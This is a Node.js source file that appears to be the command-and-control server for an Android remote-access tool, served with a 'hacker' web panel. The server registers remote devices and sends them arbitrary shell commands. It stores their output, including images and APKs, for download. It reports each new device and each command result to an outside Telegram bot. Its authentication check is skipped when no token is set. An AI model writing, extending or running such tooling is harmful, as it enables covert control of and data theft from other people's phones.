// index.js - Advanced Terminal Server + Telegram Bot + Gemini AI + File Manager
require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const { GoogleGenerativeAI } = require('@google/generative-ai');
const { Adb } = require('@devicefarmer/adbkit');
const multer = require('multer');
const { v4: uuidv4 } = require('uuid');
const fs = require('fs');
const path = require('path');

// --- File System Setup ---
const FILES_DIR = path.join(__dirname, 'file_manager_data');
if (!fs.existsSync(FILES_DIR)) {
    fs.mkdirSync(FILES_DIR, { recursive: true });
}

// --- Configuration ---
const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    maxHttpBufferSize: 1e8 // 100MB buffer for large files
});
const upload = multer({ dest: 'uploads/' });

// Middleware
app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ limit: '100mb', extended: true }));

// Initialize AI & ADB
const genAI = new GoogleGenerativeAI(process.env.GEMINI_API_KEY || '');
const adbClient = Adb.createClient();

// Data Storage
const connectedDevices = new Map(); 
const pendingCommands = new Map(); 

// --- TELEGRAM LOGGER FUNCTION ---
async function sendTelegramLog(message) {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) return;

    try {
        let text = message.length > 4000 ? message.substring(0, 3990) + "\n...[TRUNCATED]" : message;
        await fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' })
        });
    } catch (err) {
        console.error("Telegram Send Error:", err.message);
    }
}

// --- Authentication Middleware ---
const authMiddleware = (req, res, next) => {
    const token = req.headers['authorization'] || req.query.token;
    if (process.env.AUTH_TOKEN && token !== process.env.AUTH_TOKEN) {
        return res.status(401).json({ error: 'Unauthorized: Invalid Token' });
    }
    next();
};

// ==================== WEB UI (NEON HACKER THEME + SPA) ====================
const webUIHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Neon Hacker OS</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --neon: #0f0; --bg: #050505; --panel: #111; --dark-green: #003300; --danger: #ff3333; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', Courier, monospace; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
        
        /* Navbar */
        nav { display: flex; background: var(--panel); border-bottom: 2px solid var(--dark-green); }
        nav button { flex: 1; background: transparent; color: #555; border: none; padding: 15px 5px; font-size: 16px; cursor: pointer; text-transform: uppercase; font-weight: bold; transition: 0.3s; }
        nav button.active { color: var(--neon); border-bottom: 3px solid var(--neon); background: var(--dark-green); text-shadow: 0 0 5px var(--neon); }
        nav button i { margin-right: 5px; }

        /* App Container */
        .app-container { flex: 1; display: flex; flex-direction: column; overflow: hidden; padding: 10px; position: relative; }
        .tab-content { display: none; flex-direction: column; height: 100%; animation: fadeIn 0.3s; }
        .tab-content.active { display: flex; }

        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        /* General Forms */
        .top-bar { display: flex; gap: 10px; margin-bottom: 10px; flex-wrap: wrap; }
        input, select, button { background: var(--panel); color: var(--neon); border: 1px solid #0a0; padding: 12px; border-radius: 4px; font-family: inherit; font-size: 14px; outline: none; }
        input:focus, select:focus { box-shadow: 0 0 8px var(--dark-green); }
        .btn { background: var(--dark-green); cursor: pointer; font-weight: bold; text-transform: uppercase; }
        .btn:hover { background: var(--neon); color: #000; box-shadow: 0 0 10px var(--neon); }
        .btn-danger { background: #300; border-color: var(--danger); color: var(--danger); }
        .btn-danger:hover { background: var(--danger); color: #000; box-shadow: 0 0 10px var(--danger); }
        .flex-1 { flex: 1; min-width: 150px; }

        /* Home Tab */
        .dashboard { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-top: 20px; }
        .card { background: var(--panel); border: 1px solid #0a0; padding: 20px; text-align: center; border-radius: 8px; box-shadow: 0 0 10px rgba(0,255,0,0.1); }
        .card h3 { font-size: 2rem; margin-bottom: 10px; text-shadow: 0 0 10px var(--neon); }

        /* Terminal Tab */
        #terminal-output { flex-grow: 1; background: #000; border: 1px solid #050; border-radius: 4px; padding: 15px; overflow-y: auto; font-size: 13px; white-space: pre-wrap; word-break: break-all; margin-bottom: 10px; box-shadow: inset 0 0 20px #000; }
        .input-area { display: flex; gap: 8px; background: var(--panel); border: 1px solid #0a0; padding: 5px; border-radius: 4px; }
        .prompt { color: var(--neon); font-weight: bold; padding: 10px; }
        #cmdInput { border: none; background: transparent; flex-grow: 1; box-shadow: none; padding: 10px 0; }
        
        /* File Manager Tab */
        .file-list { flex-grow: 1; overflow-y: auto; border: 1px solid #050; background: var(--panel); border-radius: 4px; }
        .file-item { display: flex; justify-content: space-between; align-items: center; padding: 12px 15px; border-bottom: 1px solid #030; transition: 0.2s; }
        .file-item:hover { background: var(--dark-green); }
        .file-info { display: flex; align-items: center; gap: 10px; }
        .file-info i { font-size: 20px; }
        .file-actions button { padding: 8px 12px; margin-left: 5px; font-size: 12px; }

        /* Colors */
        .log-error { color: #ff5555; } .log-success { color: #55ff55; } .log-cmd { color: #55ffff; } .log-ai { color: #ffff55; }

        /* Mobile Adjustments */
        @media (max-width: 600px) {
            nav button { font-size: 12px; padding: 12px 2px; }
            .top-bar { flex-direction: column; }
            .input-area { flex-direction: column; padding: 10px; }
            .prompt { padding: 0 0 5px 0; border-bottom: 1px solid #050; text-align: center; }
            #cmdInput { padding: 10px; text-align: center; }
            .file-item { flex-direction: column; align-items: flex-start; gap: 10px; }
            .file-actions { width: 100%; display: flex; justify-content: space-between; }
            .file-actions button { flex: 1; }
        }
    </style>
</head>
<body>

    <nav>
        <button id="nav-home" class="active" onclick="switchTab('home')"><i class="fas fa-home"></i> Home</button>
        <button id="nav-terminal" onclick="switchTab('terminal')"><i class="fas fa-terminal"></i> Terminal</button>
        <button id="nav-files" onclick="switchTab('files')"><i class="fas fa-folder-open"></i> Files</button>
    </nav>

    <div class="app-container">
        
        <div class="top-bar">
            <input type="password" id="authToken" class="flex-1" placeholder="Auth Token (Auto-saved)">
            <select id="deviceSelect" class="flex-1">
                <option value="">Select Target Device...</option>
            </select>
            <button class="btn" onclick="loadDevices()"><i class="fas fa-sync"></i></button>
        </div>

        <div id="tab-home" class="tab-content active">
            <h2 style="text-align:center; margin-top: 20px; text-shadow: 0 0 10px var(--neon);">SYSTEM DASHBOARD</h2>
            <div class="dashboard">
                <div class="card">
                    <h3 id="stat-devices">0</h3>
                    <p>Connected Devices</p>
                </div>
                <div class="card" onclick="switchTab('terminal')" style="cursor:pointer">
                    <h3><i class="fas fa-terminal"></i></h3>
                    <p>Launch Terminal</p>
                </div>
                <div class="card" onclick="switchTab('files')" style="cursor:pointer">
                    <h3><i class="fas fa-folder"></i></h3>
                    <p>Open File Manager</p>
                </div>
            </div>
        </div>

        <div id="tab-terminal" class="tab-content">
            <div id="terminal-output">System initialized... Ready for commands.\nTip: Use 'cmd > filename.txt' to save output directly to File Manager.\n</div>
            <div class="input-area">
                <span class="prompt">root@system:~#</span>
                <input type="text" id="cmdInput" placeholder="Command / 'ai <query>' / 'cmd > file.txt'" onkeypress="if(event.key === 'Enter') processInput()">
                <button class="btn" onclick="processInput()"><i class="fas fa-paper-plane"></i></button>
            </div>
        </div>

        <div id="tab-files" class="tab-content">
            <div class="top-bar">
                <button class="btn flex-1" onclick="loadFiles()"><i class="fas fa-sync"></i> Refresh Files</button>
            </div>
            <div class="file-list" id="fileList">
                </div>
        </div>

    </div>

    <script>
        const term = document.getElementById('terminal-output');
        const tokenInput = document.getElementById('authToken');

        window.onload = () => {
            const savedToken = localStorage.getItem('hackerToken');
            if (savedToken) {
                tokenInput.value = savedToken;
                setTimeout(loadDevices, 500);
            }
        };

        // UI TAB SWITCHER
        function switchTab(tabId) {
            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('nav button').forEach(el => el.classList.remove('active'));
            document.getElementById('tab-' + tabId).classList.add('active');
            document.getElementById('nav-' + tabId).classList.add('active');
            if(tabId === 'files') loadFiles();
        }

        // LOGGER
        function log(msg, type = 'normal') {
            const div = document.createElement('div');
            div.className = 'log-' + type;
            div.textContent = msg;
            term.appendChild(div);
            term.scrollTop = term.scrollHeight;
        }

        // API CALLS
        async function fetchAPI(endpoint, options = {}) {
            const token = tokenInput.value;
            if (token) localStorage.setItem('hackerToken', token);
            const headers = { 'Authorization': token, ...options.headers };
            const res = await fetch(endpoint, { ...options, headers });
            const data = await res.json();
            if (!res.ok || !data.success) throw new Error(data.error || 'Request failed');
            return data;
        }

        // DEVICES
        async function loadDevices() {
            try {
                const data = await fetchAPI('/api/devices');
                const select = document.getElementById('deviceSelect');
                select.innerHTML = '<option value="">Select Target Device...</option>';
                data.devices.forEach(d => {
                    select.innerHTML += \`<option value="\${d.id}">\${d.model} (\${d.id})</option>\`;
                });
                document.getElementById('stat-devices').innerText = data.devices.length;
            } catch (err) {
                console.error(err);
            }
        }

        // TERMINAL INPUT PROCESSOR
        async function processInput() {
            const deviceId = document.getElementById('deviceSelect').value;
            const cmdInput = document.getElementById('cmdInput');
            let input = cmdInput.value.trim();
            if (!input) return;
            cmdInput.value = '';

            // AI Check
            if (input.startsWith('ai ')) {
                log('> ' + input, 'cmd');
                try {
                    const data = await fetchAPI('/api/ai/chat', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ prompt: input.replace('ai ', '') }) });
                    log('🤖 ' + data.response, 'ai');
                } catch(e) { log('[!] AI Error: ' + e.message, 'error'); }
                return;
            }

            if (!deviceId) return log('[!] Error: No device selected.', 'error');

            // FILE SAVE CHECK (Syntax: command > filename.ext)
            let saveAs = null;
            if (input.includes(' > ')) {
                const parts = input.split(' > ');
                input = parts[0].trim();
                saveAs = parts[1].trim();
            }

            log('> ' + input + (saveAs ? \` (Saving to \${saveAs}...)\` : ''), 'cmd');
            
            try {
                const data = await fetchAPI('/api/command/' + deviceId, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ command: input, saveAs: saveAs })
                });
                if(data.savedToFile) {
                    log(\`[✔] Output saved to File Manager as \${saveAs}\`, 'success');
                } else {
                    log(data.result || '[Execution complete. No output.]', 'success');
                }
            } catch (err) {
                log('[!] Failed: ' + err.message, 'error');
            }
        }

        // FILE MANAGER CONTROLS
        async function loadFiles() {
            const list = document.getElementById('fileList');
            list.innerHTML = '<div style="padding:15px">Loading files...</div>';
            try {
                const data = await fetchAPI('/api/files');
                list.innerHTML = '';
                if(data.files.length === 0) return list.innerHTML = '<div style="padding:15px">No files found. Run a command with "> filename" to save data.</div>';
                
                data.files.forEach(f => {
                    const icon = f.name.endsWith('.png') || f.name.endsWith('.jpg') ? 'fa-image' : f.name.endsWith('.apk') ? 'fa-android' : 'fa-file-alt';
                    list.innerHTML += \`
                        <div class="file-item">
                            <div class="file-info"><i class="fas \${icon}"></i> <span>\${f.name} <small style="color:#0a0">(\${f.size} bytes)</small></span></div>
                            <div class="file-actions">
                                <button class="btn" onclick="downloadFile('\${f.name}')"><i class="fas fa-download"></i></button>
                                <button class="btn btn-danger" onclick="deleteFile('\${f.name}')"><i class="fas fa-trash"></i></button>
                            </div>
                        </div>
                    \`;
                });
            } catch(e) { list.innerHTML = '<div class="log-error" style="padding:15px">Error loading files: ' + e.message + '</div>'; }
        }

        async function downloadFile(name) {
            const token = tokenInput.value;
            window.open(\`/api/files/download/\${name}?token=\${token}\`, '_blank');
        }

        async function deleteFile(name) {
            if(!confirm('Delete ' + name + '?')) return;
            try {
                await fetchAPI('/api/files/delete/' + name, { method: 'DELETE' });
                loadFiles(); // Refresh
            } catch(e) { alert('Delete failed: ' + e.message); }
        }
    </script>
</body>
</html>
`;

app.get('/', (req, res) => res.send(webUIHTML));

// ==================== REST API ENDPOINTS ====================

app.get('/api/devices', authMiddleware, (req, res) => {
    try {
        const devices = Array.from(connectedDevices.values()).map(d => ({
            id: d.socket.deviceId,
            model: d.deviceInfo?.model || 'Android Device',
        }));
        res.json({ success: true, devices });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// AI Processing
app.post('/api/ai/chat', authMiddleware, async (req, res) => {
    try {
        if(!process.env.GEMINI_API_KEY) throw new Error("Gemini API Key missing.");
        const model = genAI.getGenerativeModel({ model: 'gemini-1.5-flash' });
        const result = await model.generateContent("System context: Expert hacker/linux admin. " + req.body.prompt);
        res.json({ success: true, response: result.response.text() });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Execute Command & Optional File Save Route
app.post('/api/command/:deviceId', authMiddleware, async (req, res) => {
    const { deviceId } = req.params;
    const { command, saveAs } = req.body;

    const device = connectedDevices.get(deviceId);
    if (!device) return res.status(404).json({ success: false, error: 'Device disconnected' });

    const requestId = Date.now() + '-' + uuidv4().substring(0,8);
    const commandPromise = new Promise((resolve, reject) => {
        const timer = setTimeout(() => {
            pendingCommands.delete(requestId);
            reject(new Error('Device timed out'));
        }, 60000); // 60s timeout for large dumps
        pendingCommands.set(requestId, { resolve, reject, timer, command, deviceId }); 
    });

    try {
        device.socket.emit('execute_command', { requestId, command });
        let result = await commandPromise;

        // FILE SAVING LOGIC
        if (saveAs) {
            const safeName = path.basename(saveAs); // Prevent directory traversal
            const filePath = path.join(FILES_DIR, safeName);
            
            // Check if result is base64 (crude check for images/apks)
            const isBase64 = result.match(/^([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{2}==)?$/);
            const isBinaryTarget = safeName.endsWith('.png') || safeName.endsWith('.jpg') || safeName.endsWith('.apk') || safeName.endsWith('.mp4');
            
            if (isBinaryTarget && isBase64) {
                // Decode base64 to binary
                const buffer = Buffer.from(result, 'base64');
                fs.writeFileSync(filePath, buffer);
            } else {
                // Save as raw text
                fs.writeFileSync(filePath, result, 'utf8');
            }
            
            return res.json({ success: true, requestId, savedToFile: true, file: safeName });
        }

        res.json({ success: true, requestId, result });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// --- FILE MANAGER ROUTES ---
app.get('/api/files', authMiddleware, (req, res) => {
    try {
        const files = fs.readdirSync(FILES_DIR).map(name => {
            const stats = fs.statSync(path.join(FILES_DIR, name));
            return { name, size: stats.size };
        });
        res.json({ success: true, files });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/files/download/:name', authMiddleware, (req, res) => {
    try {
        const safeName = path.basename(req.params.name);
        const filePath = path.join(FILES_DIR, safeName);
        if (fs.existsSync(filePath)) {
            res.download(filePath);
        } else {
            res.status(404).send('File not found');
        }
    } catch (error) {
        res.status(500).send('Error downloading file');
    }
});

app.delete('/api/files/delete/:name', authMiddleware, (req, res) => {
    try {
        const safeName = path.basename(req.params.name);
        const filePath = path.join(FILES_DIR, safeName);
        if (fs.existsSync(filePath)) {
            fs.unlinkSync(filePath);
            res.json({ success: true });
        } else {
            res.status(404).json({ success: false, error: 'File not found' });
        }
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});


// ==================== SOCKET.IO HANDLERS ====================
io.on('connection', (socket) => {
    socket.on('register_device', async (data) => {
        const { deviceId, deviceInfo } = data;
        if (!deviceId) return;

        socket.deviceId = deviceId;
        socket.deviceInfo = deviceInfo || { model: 'Unknown' };

        connectedDevices.set(deviceId, { socket, deviceInfo });
        socket.join('device:' + deviceId);

        await sendTelegramLog("📱 <b>New Device Connected!</b>\nID: " + deviceId + "\nModel: " + socket.deviceInfo.model);
        socket.emit('registered', { success: true });
    });

    socket.on('command_response', async (data) => {
        const { requestId, success, result, error } = data;
        const pending = pendingCommands.get(requestId);

        if (pending) {
            clearTimeout(pending.timer);
            pendingCommands.delete(requestId);

            // Log short output to telegram to avoid spam
            let shortResult = typeof result === 'string' && result.length > 200 ? result.substring(0, 200) + '...[TRUNCATED]' : result;
            let tgMsg = success 
                ? "✅ <b>Command Success</b>\nDevice: " + pending.deviceId + "\nCmd: " + pending.command + "\nOutput:\n" + shortResult
                : "❌ <b>Command Failed</b>\nDevice: " + pending.deviceId + "\nCmd: " + pending.command + "\nError:\n" + error;

            await sendTelegramLog(tgMsg);

            if (success) pending.resolve(result);
            else pending.reject(new Error(error || 'Failed on device'));
        }
    });

    socket.on('disconnect', async () => {
        if (socket.deviceId) {
            connectedDevices.delete(socket.deviceId);
            await sendTelegramLog("⚠️ <b>Device Disconnected</b>\nID: " + socket.deviceId);
        }
    });
});

// ==================== SERVER START ====================
const PORT = process.env.PORT || 10000;
server.listen(PORT, '0.0.0.0', () => {
    console.log("🚀 Advanced OS Server Running on Port " + PORT);
});
